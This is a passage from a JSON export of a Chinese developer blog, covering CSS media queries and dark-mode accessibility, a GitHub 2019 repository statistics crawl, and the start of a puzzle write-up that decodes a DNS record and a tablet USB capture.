个很少有网站充分利用的媒体查询。</p>\n<h2>print</h2>\n<p><code>print</code> 媒体查询其实已经“历史悠久”了，<strong>只要使用 <code>@media print {...}</code> 就可以创建只在打印页面时生效的样式。</strong>通过这种方式，我们可以让页面在打印时应用一套为打印优化的样式，增强页面在物理纸张上的可访问性。</p>\n<blockquote><p>维基百科是对打印样式做了单独适配的著名例子。</p></blockquote>\n<p><strong>由于在打印的情况下，页面已经离开了“可交互”的范围，还有分页这种在屏幕中无需考虑的问题，要让页面在物理纸张上仍能被轻松地阅读，我们需要做一些特殊的适配。</strong>直接来看一个例子吧。以下是 MDx 针对打印情况进行的一些特殊优化，样式的具体理由已经写在了注释中。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media print {\r\n    /*隐藏不必要的元素*/\r\n    header, .mdx-ad-after-article, .mdx-ad-in-article, .mdx-post-money, .page-footer-nav, .mdx-same-posts, .spanout button, .mdui-drawer, .mdui-overlay, .mdui-menu, .mdx-share-img-dialog, .mdx-share-wechat-dialog {\r\n        display: none!important;\r\n    }\r\n\r\n    /*使用下划线标记链接*/\r\n    article a {\r\n        text-decoration: underline!important;\r\n    }\r\n    /*由于纸张不可交互，在链接后显示链接到的 URL*/\r\n    article a::after {\r\n        content: \"(\" attr(href) \")\";\r\n    }\r\n\r\n    /*强制白底黑字*/\r\n    html &gt; body {\r\n        background-color: white!important;\r\n    }\r\n    article p {\r\n        color: rgba(0,0,0,.8)!important;\r\n    }\r\n\r\n    /*对于纸张上的长文章，衬线字体拥有更好的可读性。以下字体列表来自 fonts.css*/\r\n    article {\r\n        font: 13pt Georgia, \"Nimbus Roman No9 L\", \"Songti SC\", \"Noto Serif CJK SC\", \"Source Han Serif SC\", \"Source Han Serif CN\", STSong, \"AR PL New Sung\", \"AR PL SungtiL GB\", NSimSun, SimSun, \"TW\\-Sung\", \"WenQuanYi Bitmap Song\", \"AR PL UMing CN\", \"AR PL UMing HK\", \"AR PL UMing TW\", \"AR PL UMing TW MBE\", PMingLiU, MingLiU, serif!important;\r\n    }\r\n\r\n    /*除部分元素外，禁止在元素内部分页*/\r\n    * {\r\n        page-break-inside: avoid;\r\n    }\r\n    article p, article a, #comments, article {\r\n        page-break-inside: auto;\r\n    }\r\n}</pre>\n<p>MDx 自 1.9.3 版本起已经包含了对文章页的打印样式优化。可以很容易地看出，优化后的样式在物理纸张上将更容易阅读。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1345\" height=\"1602\" class=\"aligncenter size-full wp-image-1959\"></a>\n<h2>prefers-color-scheme</h2>\n<p><code>prefers-color-scheme</code> 是最近才被浏览器广泛支持的一个媒体查询，但它的功能却很强大：<strong>响应系统级黑暗模式。</strong>这样，我们可以在开启黑暗模式的系统中让网页具有更好的可读性。不过由于这个媒体查询直到最近才被广泛支持，因此大部分网站对此并没有进行适配。</p>\n<blockquote><p>一些适配这一特性的网站：少数派、微信公众平台（文章页）等。</p></blockquote>\n<p>通过像这样的媒体查询，我们可以在系统启用黑暗模式时让页面实时响应：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    body {\r\n        background-color: #212121;\r\n        color: rgba(255, 255, 255, .7);\r\n    }\r\n}</pre>\n<p><code>prefers-color-scheme</code> 一共有 3 个可能值：<code>no-preference</code>, <code>light</code> 和 <code>dark</code>。你也可以不像上面的例子那样默认使用亮色样式并在黑暗模式下启用黑暗样式，而可以反过来将黑暗样式作为默认，用亮色样式覆盖。在不支持的浏览器上将会显示默认样式（即媒体查询不会生效）。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<h2>prefers-reduced-motion</h2>\n<p>看名字就猜得出，<code>prefers-reduced-motion</code> 是和 <code>prefers-color-scheme</code> 师出同门的媒体查询。因此，和 <code>prefers-color-scheme</code> 一样，它也是在最近才获得了浏览器的广泛支持。它的作用也很强大：<strong>响应系统的“减弱动态效果”模式。</strong>这对某些不喜欢甚至无法接受动画的用户可能很有帮助。要知道，对有些用户来说这甚至是医疗上的必要。使用如下的媒体查询，我们可以在系统启用减弱动态效果模式时让页面实时响应，减弱动画：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-reduced-motion: reduce) {\r\n    /*只是一个示例，实际情况中可以保留一些淡入淡出效果*/\r\n    * {\r\n        transition: all 0s!important;\r\n        transform: none!important;\r\n    }\r\n}</pre>\n<p><code>prefers-reduced-motion</code> 只有 2 个可能值：<code>no-preference</code> 和 <code>reduce</code>，在不支持的浏览器上该媒体查询不会生效。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"792\" height=\"515\" class=\"aligncenter size-full wp-image-1962\"></a>\n<h1>黑暗模式适配</h1>\n<p>黑暗模式可不是简单地切换到黑底白字这么简单。<strong>单纯地使用黑底白字会导致页面元素之间对比度过高，文字刺眼，反而降低了页面的可访问性。</strong>我在下面总结了几条应用在了 MDx 中的黑暗模式优化规则和 Google 推荐的优化规则：</p>\n<p><strong>一是避免黑底白字。</strong>黑底白字看起来真的很难受，事实上，深灰和浅灰是黑暗模式最好的配色。比较下方例子里的两段文本，毫无疑问深灰色背景和浅灰色文字搭配的样式的可读性要比黑底白字高很多。（p.s. 有时候这条规则在白底黑字时也适用）</p>\n<p><strong>二是更改部分元素的亮度和对比度以增强可读性。</strong>你可能已经注意到了，下面优化的例子里标题文字的颜色改变了。很明显，未优化的黑暗模式中标题可读性不如优化的版本。在实际中，我们通常可以通过 CSS 滤镜来实现这一更改。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    h1 {\r\n        /*反相颜色后再将色相旋转 180 度，使亮度反相*/\r\n        filter: invert(1) hue-rotate(180deg);\r\n    }\r\n}</pre>\n<p><strong>三是避免让图片过亮。</strong>未经处理的图片通常会导致过高的对比度，降低可读性。在 MDx 中，我选择降低图片的亮度来避免图片刺眼，而 Google 的建议则是使图片灰度，不过这会影响图片的整体观感。无论是哪一种方案，都可以使用 CSS 滤镜来轻松实现。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    img { \r\n        /*MDx 方案*/\r\n        filter: brightness(.8);\r\n        /*Google 方案*/\r\n        filter: grayscale(.5);\r\n    }\r\n}</pre>\n<div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是未优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg?x-oss-process=image/interlace,1/quality,Q_90#\"></p>\n</div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是经过优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg?x-oss-process=image/interlace,1/quality,Q_90#\"></p>\n</div>\n</div>\n<h1>其他细节</h1>\n<p>还有一些细节，虽然简单，但不可或缺。我把一部分没有在上文提到的 MDx 中的细节列在了这里。</p>\n<p><strong>一是允许页面缩放。</strong>在开发响应式页面时，很多网站会在页面头部添加这样一个 <code>meta</code>：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\"&gt;</pre>\n<p>这样的 <code>meta</code> 设定了页面的宽度，却也固定了页面的缩放比例，用户难以手动放大网页。<strong>这样的设置对一部分视力障碍用户非常不友好</strong>，以至于苹果决定在自家的浏览器上忽略禁止缩放的 <code>meta</code>。按照 Google 的推荐，如果你在 MDx 设置中启用了“允许页面缩放”，那么 MDx 会输出这样的 <code>meta</code> 标签，允许页面进行五倍以内的缩放：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=5\"&gt;</pre>\n<p><strong>尽管很多时候放大页面会导致页面结构被破坏，但这大大增强了页面的可访问性，利大于弊。</strong>因此，在 MDx 中，“允许页面缩放”是默认启用的。</p>\n<p><strong>二是在跨设备阅读时同步阅读记录。</strong>这属于 MDx 的“元老级”功能之一。注意到页面右上角的那个“在其他设备上继续阅读”的按钮了吗？如果你滚动页面后重新点击它，你会发现二维码发生变化了。通过在二维码中记录阅读进度，用户在扫描二维码切换设备阅读时，MDx 在新设备上会自动滚动到和原设备上一致的位置——好吧，目前基于百分比的算法在某些情况下可能不太准，但我已经设计了一个更复杂但更精确的阅读进度记录算法，之后就会更新到 MDx 中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"574\" class=\"aligncenter size-full wp-image-1976\"></a>\n<p><strong>三是避免 Web 字体阻塞渲染。</strong>如果你在页面中使用了 Web 字体，在字体加载完成之前，浏览器可能不会渲染任何文本，这就导致用户可能需要等待一段时间才能开始浏览网页。Google 推荐使用 <code>font-display: swap;</code> 来向浏览器指定网页的 Web 字体渲染策略。这一规则会提供一个比较短的等待周期，如果在这段时间内 Web 字体没有完成加载，那么浏览器会以 fallback 字体渲染文本。任意时刻一旦 Web 字体完成渲染，浏览器就会使用 Web 字体重新渲染文本。这在大多数情况下都能满足可访问性的需求。</p>\n<p><strong>四是确保 html 元素具有合适的 <code>lang</code> 属性。</strong>这一属性声明了页面的主要语言，浏览器可以据此调整渲染策略，或者触发自动翻译；屏幕阅读器也能更好地阅读网页。</p>\n<p><strong>五是确保页面主要内容在丢失/禁用了 Javascript 甚至 CSS 的情况下仍然可用。</strong>作为一个以内容为主的网站，MDx 在禁用了 Javascript 的情况下页面主要内容仍然可用。这不只是为了 SEO，更是为了保证页面的可访问性。的确，目前的情况下，如果开启了 Lazyload，MDx 在禁用 Javascript 的情况下图片的确无法显示，但我会在后续版本中尽可能的优化这一问题。</p>\n<h1>附录：媒体查询开发技巧</h1>\n<p>有的时候，光有 CSS 响应媒体查询还不够，我们可能需要在 Javascript 中实时响应媒体查询。用如下代码就可以很简单地响应媒体查询：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">let mql = window.matchMedia(\"(prefers-reduced-motion: reduce)\");\r\nmql.addListener(handleMediaChange);\r\n\r\n//在添加监听后先调用一次，获得当前查询结果\r\nhandleMediaChange(mql);\r\n\r\nfunction handleMediaChange(mql){\r\n    if(mql.matches){\r\n        //查询匹配\r\n    }else{\r\n        //查询不匹配\r\n    }\r\n}</pre>\n<p>在开发上述媒体查询的过程中，我们需要频繁地切换系统的相应模式或者调出打印窗口。<strong>实际上，Chrome 提供了更简单的调试方法：</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1946\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"723\" height=\"681\"></a>\n<p>只要在这里更改模式，相关媒体查询就能实时生效。这不会影响其他标签页，在关闭开发者工具之后也会自动恢复系统设置。</p>\n","link":"https://flyhigher.top/develop/1912.html"},{"title":"MDx Blog 现已随 MDx 1.9.5 发布","date":"2020-01-22 17:54:11","description":"<p>随着 MDx 发布 1.9.5 更新，<a href=\"https://mdxblog.flyhigher.top/\" rel=\"noopener noreferrer\" target=\"_blank\">MDx Blog</a> 现已建立。我将会在 MDx Blog 中分享一些开发故事并发布 MDx 更新日志。</p>","link":"https://flyhigher.top/diary/1905.html"},{"title":"GitHub 2019 统计无垠版","date":"2020-01-12 13:02:00","description":"\n<h1>缘起</h1>\n<p>2019 年底，我突发奇想想要自己统计一番 GitHub 上存储库的一些信息。尽管 GitHub 有自己的<a href=\"https://octoverse.github.com/\" target=\"_blank\" rel=\"noopener noreferrer\">年度统计</a>，我还是想试着自己爬取一下，说不定能挖出什么有意思的信息，何况这是我第一次有机会处理比较大量的数据，也算是一种学习的过程吧。于是花了一下午写了个简单的爬虫（时间都花在增加 Rate Limit 上了…），然后扔在了两台服务器上开始跑（GitHub  API 真是好文明）。</p>\n<p>从 2019.11.21 3 时到 2020.1.12 24 时的 52 天 21 小时内，我的爬虫一共爬取了<strong>与 2,024,705 个用户有关<sup>*</sup>的 14,651,923 个公共存储库的基础信息</strong>，平均每秒爬取 3.2 个存储库。据 GitHub 的官方数据计算，我爬取了大约 15% 的存储库信息，但由于封禁库和私有库的数量未知，我暂时无法确定我爬取的存储库占公共库的比例。同时由于存储库数量较多，基本可以认为爬取到的样本在时间尺度上已经足够随机，可以通过统计得出一般结论。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"700\" height=\"606\" class=\"aligncenter size-full wp-image-1892\"></a>\n<p>爬到自己了，合影.jpg</p>\n<p>那么下面就来看看统计出来的一些结果吧。爬虫的技术细节和数据集下载放在文末。</p>\n<p>* 指这些用户拥有至少一个库</p>\n<h1>统计信息</h1>\n<p><strong>以下统计结果均基于已放于文末的数据集。</strong>由于爬虫爬取的时间跨度长，加上我并没有完整爬取 GitHub 所有存储库，因此我<strong>不能保证以下统计结果符合真实情况</strong>，各位可以下载数据集或自行爬取进行验证。</p>\n<h2>一些数据</h2>\n<div>\n<div>\n<div>\n<span>3,120,930</span><br>总爬取用户数</div>\n<div>\n<span>44.7%</span><br>的存储库创建<br>自 Fork</div>\n<div>\n<span>6.59%</span><br>的账户被删除或<br>封禁<sup>1</sup>\n</div>\n<div>\n<span>23,913</span><br>单用户拥有最大<br>库数量<sup>2</sup>\n</div>\n</div>\n</div>\n<p><sup>1</sup> 基于用户 ID 规律合理推断<br><sup>2</sup> 统计范围仅限于当前数据集</p>\n<p>比较出乎我意料的是创建自 Fork 的存储库的占比。我预估这样的存储库占比不会太低，但没有想到能接近一半。此外单用户拥有最大库数量也大大超出了我的预期，<a href=\"https://github.com/pombredanne\" rel=\"noopener noreferrer\" target=\"_blank\">pombredanne</a> 这个用户名下拥有将近 24k 的存储库，不过绝大多数都是 Fork 来的，在情理之中。此外<strong>这个数据集中</strong>拥有最多存储库的账户其实是一个组织 <a href=\"https://github.com/gitpan\" rel=\"noopener noreferrer\" target=\"_blank\">gitpan</a>，这个组织拥有 36,377 个存储库。</p>\n<h2>语言</h2>\n<p><canvas></canvas><br>\n首先必须要说明的是，在这个榜单中我<strong>排除了 HTML 和 CSS</strong>，因为在严格意义上它们不属于“编程语言”。如果把它们计算进来的话，分别有 640,368 个和 361,425 个存储库的主要语言分别是 HTML 和 CSS，这样在这份榜单中它们可以排到第 6 和 第 10 名。JavaScript 毫无疑问获得第一，第二名 Python 的热度则和 JavaScript 相差将近一半。<strong>此外还有 2,448,486 个存储库未能识别出语言，占比 16.7%。</strong>在上面的榜单之外，与机器学习和数据科学相关的语言还有 Jupyter Notebook 排名第 13，R 排名 20，Julia 排名 43。</p>\n<p>说实话这份排名和 GitHub 官方的排名<strong>差别很大</strong>，除了前三名，后面的基本都不太一样。我的排名统计结果完全基于 GitHub 对于存储库的主要语言识别，加上我的存储库数据不完整，和官方的数据不同是很正常的，可以做一个参考，但大概率还是官方排名更加准确。</p>\n<h2>许可证</h2>\n<p><canvas></canvas></p>\n<p>自 GitHub 推出许可证功能以来，拥有许可证的存储库比例升升降降，却始终没有超过一半。<strong>选择一个合适的许可证对项目的良好发展真的很有帮助</strong>，要了解如何选择合适的许可证，请参阅<a href=\"https://www.runoob.com/w3cnote/open-source-license.html\" rel=\"noopener noreferrer\" target=\"_blank\">这篇文章</a>。</p>\n<p><canvas></canvas></p>\n<p>对于拥有许可证的存储库，MIT<del> 麻省理工许可证 </del>总是占比最大的；第二则是 Apache-2.0 许可证。此外，WTFPL 许可证也挤入了前 15 名。</p>\n<h2>星标</h2>\n<p><canvas></canvas><br>\nStar 数量毫无疑问是一个存储库受欢迎程度的体现，而 Star 数高的项目基本上大家都了解过。<strong>截至爬取结束时间</strong>，GitHub 中 Star 数最多的库是 <a href=\"https://github.com/freeCodeCamp/freeCodeCamp\" rel=\"noopener noreferrer\" target=\"_blank\">freeCodeCamp</a> <del>非常完美的驼峰命名法</del>，其次则是著名项目 <a href=\"https://github.com/996icu/996.ICU\" rel=\"noopener noreferrer\" target=\"_blank\">996.ICU</a>。<a href=\"https://github.com/vuejs/vue\" rel=\"noopener noreferrer\" target=\"_blank\">Vue</a> 现在的 Star 数已经稳压 <a href=\"https://github.com/facebook/react\" rel=\"noopener noreferrer\" target=\"_blank\">React</a> 一头，Vue YES! 此外 <a href=\"https://github.com/sindresorhus/awesome\" rel=\"noopener noreferrer\" target=\"_blank\">awesome</a> 也挤进第七名。<br><canvas></canvas><br>\n由于 Star 需要时间积累，新项目的 Star 数量很可能是比不过老项目的，这就会导致有实力的新项目无法出现在榜单中。因此我还统计了日均 Star 数，试图通过日均 Star 数来反映项目受欢迎的程度。<strong>由于正热门的项目会比老牌热门项目有优势，这一项的统计范围是 2020-01-01 之前的所有存储库。</strong>996.ICU 和 freeCodeCamp 再次出现在前 10 名，而最近的热门项目 <a href=\"https://github.com/wenyan-lang/wenyan\" rel=\"noopener noreferrer\" target=\"_blank\">wenyan</a> 则飙升至第 2 名。此外还有 <a href=\"https://github.com/menzi11/BullshitGenerator\" rel=\"noopener noreferrer\" target=\"_blank\">BullshitGenerator</a>，即最近热门的“狗屁不通文章生成器”和 <a href=\"https://github.com/evil-huawei/evil-huawei\" rel=\"noopener noreferrer\" target=\"_blank\">evil-huawei</a> 分列第 3 和第 5 名。<br><canvas></canvas><br>\n说实话这个曲线<strong>比我预估的陡多了。</strong>你可能已经注意到了，这个图表的横轴不是均匀缩放的，实际上曲线要比看起来陡很多。同时受爬取方式的影响，GitHub 中 Star 数较少的存储库数量远比我爬取到的多。也就是说，<strong>实际情况下曲线远比这个图表上的陡。</strong>拿点 Star 不容易啊。</p>\n<h2>名称</h2>\n<p><canvas></canvas><br>\n终于知道了原来存储库的名称是有长度限制的…尽管最长有 100 位，<strong>大部分人还是喜欢 8 位长的存储库名。</strong>此外 1 位长的名称也比我预估的要多一些。举几个存储库名称长度为 100 的例子吧。</p>\n<ul>\n<li>testing-something-elsetesting-something-elsetesting-something-elsetesting-something-elsetesting-some</li>\n<li>acts_as_validated_config_so_app_will_not_run_in_random_situation_and_qa_gays_will_not_cry_to_you_whe</li>\n<li>……………………………………..________-………………………………-.—……</li>\n<li>—————————————————————————————————-</li>\n<li>nyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyan</li>\n</ul>\n<p>…创造力有够丰富的。</p>\n<p><canvas></canvas></p>\n<p>最近 GitHub 上有一种奇怪的风气，那就是建立 Awesome 合集<del>骗 Star</del>。看起来 Awesome 存储库满地都是，甚至还出现了关于 Awesome 的 Awesome 合集这种迷惑行为。于是我统计了一下，<del>还好，</del>占比<del>才</del> 0.5% 不到<del>，Awesomer 们任重而道远呐</del>。</p>\n<p><canvas></canvas></p>\n<p>尽管要在 github.io 上托管网站，存储库不一定要以 .github.io 结尾，但我还是统计了一下。拥有这类存储库的用户比我预想的要少一些，看来还有很多人没有完全发挥 GitHub 的完整实力啊<del>（比如我 Doge）</del>。同时<strong>这类存储库在所有存储库中占比 1.12%</strong>，看起来不多<del>，不过至少比 Awesome 多</del>。<br><canvas></canvas><br>\n看得出来 GitHub 对于用户名长度的限制是 1-40 位。用户名最短的 27 位占据了 <code>A-Z</code> 外加 <code>-</code> 的所有可能，而用户名最长的则是一个组织 <a href=\"https://github.com/UOIT-RESEARCH-database-information-group\" rel=\"noopener noreferrer\" target=\"_blank\">UOIT-RESEARCH-database-information-group</a>。不知道是巧合还是某种规律，<strong>最受欢迎的用户名长度和存储库名称长度一样，都是 8</strong>，有点意思。</p>\n<h2>创建时间</h2>\n<p><canvas></canvas><br>\n由于我并没有完整爬取所有存储库，我只能以相对值来统计每月新增存储库数量的变化趋势。<strong>在这个图表中，我将 2017-09 的数据设为了 100%。</strong>你一定一眼就能注意到 2017 年 6,7,8 月的“一柱擎天”。<del datetime=\"2020-02-05T09:18:30+00:00\">我第一次看到这个数据的时候的确愣了一下，不过就着这条新闻看就能明白为什么了：<strong>2017 年 6 月微软收购 GitHub。</strong></del></p>\n<blockquote><p>重新确认了一下，微软收购 GitHub 比这个高峰晚了一年，目前我对这个高峰没有什么很好的解释，如果你有什么思路的话欢迎评论。</p></blockquote>\n<p><strong>需要注意的是这张图表中我排除了 Fork 存储库</strong>，因为 Fork 存储库在 API 中的创建时间是原始存储库的时间，会影响整体趋势。此外，GitHub 中还有一个创建于 2007 年 10 月 29 日的存储库，那就是 <code>id: 1</code> 的…</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"mojombo\" data-mdxgithubp=\"grit\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/mojombo/grit\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>而它的创建者正是 GitHub 的创始人之一 Tom Preston-Werner。</p>\n<h1>一些有趣的结果</h1>\n<p>当初打算自己爬的目的之一就是想看看能不能挖出什么有意思的信息，结果真的有一些不挖不知道的信息。</p>\n<h2>奇怪的存储库</h2>\n<p>在爬取到的所有存储库中，<strong>有 3 个存储库是“无主”的</strong>，即它们的 owner 属性为空。这三个存储库的基本信息如下。</p>\n<div class=\"mdui-table-fluid mdui-table-hoverable\"><table class=\"mdui-table\">\n<thead><tr>\n<th>ID</th>\n<th>名称</th>\n<th>Forked</th>\n<th>Star</th>\n<th>语言</th>\n<th>许可证</th>\n<th>创建于</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>72385291</td>\n<td>vscode-redprl</td>\n<td>否</td>\n<td>10</td>\n<td>TypeScript</td>\n<td>apache-2.0</td>\n<td>2016-10-31 08:50:01</td>\n</tr>\n<tr>\n<td>181218346</td>\n<td>electron-sys</td>\n<td>否</td>\n<td>10</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-14 03:20:56</td>\n</tr>\n<tr>\n<td>181391880</td>\n<td>node-sys</td>\n<td>否</td>\n<td>6</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-15 09:33:08</td>\n</tr>\n</tbody>\n</table></div>\n<p><strong>更奇怪的是这三个存储库“无主”的情况还不一样。</strong>第一个存储库可以通过 <code>/repositories</code> 这个 GitHub API 找到， <a href=\"https://api.github.com/repositories?since=72385290\" target=\"_blank\" rel=\"noopener noreferrer\">这个链接</a>中的第一个存储库就是它；而其余两个存储库甚至无法在 <code>/repositories</code> API 中找到。不过就算能在 API 中找到第一个存储库，它的 <code>html_url</code>，即 <code>https://github.com//vscode-redprl</code> 仍然是不可访问的。这可能是 GitHub 早期的一个 Bug 导致的，不过我仍然对爬虫是如何找到这三个存储库的以及这些 Stars 是哪里来的感到好奇。</p>\n<h2>奇怪的用户名</h2>\n<p>在爬虫爬了一段时间以后，API 中突然开始出现大量的以 fdp 开头的 18 位乱码作为用户名的用户。这些用户拥有的存储库和 starred 的存储库都为 0，而他们的 <code>html_url</code> 为 404。以下是几个例子。</p>\n<ul>\n<li>fdpEpolGCEdQX4ZlRJ</li>\n<li>fdp8XaVrdtmDZnO5pR</li>\n<li>fdp8XRAGnwAOkTr2Ya</li>\n</ul>\n<p>由于我的爬虫并没有超过 Rate Limit，所以我排除了这是污染数据的可能。我怀疑这可能是某种 Bot 账户，于是一边更新爬虫过滤掉了这些用户，一边给 GitHub 支持发邮件问了具体情况。过了两天 GitHub 回复我说这些是<strong>被自动判为可疑进而被封禁的用户</strong>（原话是 they have been flagged by our automated measures for detecting suspicious behavior）。<del>想到我正在疯狂爬取 GitHub，突然害怕.webp</del></p>\n<p>行吧。</p>\n<h1>技术细节</h1>\n<p>爬虫使用 Python3 编写，数据库使用 MySQL。爬虫共使用了 4 个 API Token，在两台服务器上分布式爬取。爬取思路为：</p>\n<ol>\n<li>通过 <code>/users</code> API 遍历用户，每个请求最多获取 30 个用户信息</li>\n<li>循环 30 个用户，分别获取 <code>/users/&lt;user_name&gt;/starred</code> 和 <code>/users/&lt;user_name&gt;/repos</code> API 中的存储库信息，每个请求最多获取 100 个存储库信息，超过 100 个的分页获取</li>\n<li>提取存储库信息，插入数据库。对于已存在的存储库，更新数据</li>\n<li>获取下 30 个用户信息</li>\n</ol>\n<p>由于爬取过程中我多次调整了爬虫逻辑，爬虫爬取到的用户 ID 区间并非连续的，具体区间为1-839586, 14800001-14885493 及 28965251-31161101。</p>\n<h1>免责声明</h1>\n<p>本站会尽可能地提供准确信息，但本站不对此文章中信息的准确性和即时性及带来的任何影响负责。</p>\n<p>本站不代表 GitHub 官方，本文仅供学习之用，请不要将本文内容直接用于任何商业项目中。</p>\n<h1>数据集下载</h1>\n<p>导出的 SQL 文件大约为 1.38GB，全部放在了 GitHub 上（在危险的边缘试探.webp</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"github-analysis-2019\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/github-analysis-2019\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>此外我也提供了 MEGA 下载，链接<a href=\"https://mega.nz/#F!juxm3A6T!7Vwpzi82W1OFrqTLu1A1pQ\">在这里</a>。</p>\n","link":"https://flyhigher.top/develop/1564.html"},{"title":"Milkice 跨年红包解谜 Writeup 及无垠跨年红包解谜答案","date":"2020-01-02 04:29:19","description":"\n<blockquote><p><del>又到了水文章的时间呢</del></p></blockquote>\n<p>先说明一下，这篇文章原本不是在计划中的，而原来说好的「在路上的两篇」文章<del>绝对不会咕</del>。我自己的红包答案本来打算直接塞在年度总结里的，结果发现稍微有些长，再加上我还花了一些时间解了<a href=\"https://milkice.me/\">奶冰</a>的红包解谜游戏，就打算把两个解谜过程放在一起单独写一篇文章。<del>真是个水文章的好理由</del>（被打死</p>\n<h1>奶<del> 子 </del>冰的红包</h1>\n<p>奶冰的红包题目比我的难多了，所以让我们先从难的开始吧。首先看一下<a href=\"https://milkice.me/2019/12/31/2019-summary/\">题目</a>：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1524\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"746\" height=\"410\"></a>\n<p>入口是 <code>happy.2020.milkice.me</code>，扔到浏览器里面表示找不到 IP，那么大概率就是 DNS 的 TXT 记录了，查一下得到 <code>nb2hi4dthixs63ljnrvwsy3ffzwwkl3tivrvezluomxxg5dsmvqw2ltqmnqxa3th</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1525\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"896\" height=\"278\"></a>\n<p>第一眼没看出来是什么编码，直觉是 BaseXX 系列的编码，加上提示“不只有 Base64”，可以推断出是 Base32，转大写解码得到 <code>https://milkice.me/sEcRets/stream.pcapng</code>。是个 URL，下载得到一个 Wireshark 文件，打开一看是和某 USB 设备的通讯抓包。<del>不会做，不做了。</del></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1526\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"813\"></a>\n<p>奶冰提示我“Google 上搜得到”，结合第二条提示搜索“wacom pcapng”找到了<a href=\"https://blogs.tunelko.com/2017/02/05/bitsctf-tom-and-jerry-50-points/\">这篇文章</a>（<del>这™就是答案啊</del>）。看起来是一样的套路，即通过解析数据得到数位板上画的内容，于是按文章的思路筛选出数位板发给主机的数据，导出，然后再用 tshark 导出文本数据。本来我想直接用文章中的 POC 的，结果折腾半天因为源的蜜汁原因库没装上，于是按文章中给出的数据结构自己写了段代码，分别导出 X、Y 轴数据扔进 Excel 画散点图。（<del>别问我为什么用 Excel，因为我手边没有更好的工具了</del>）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1528\" 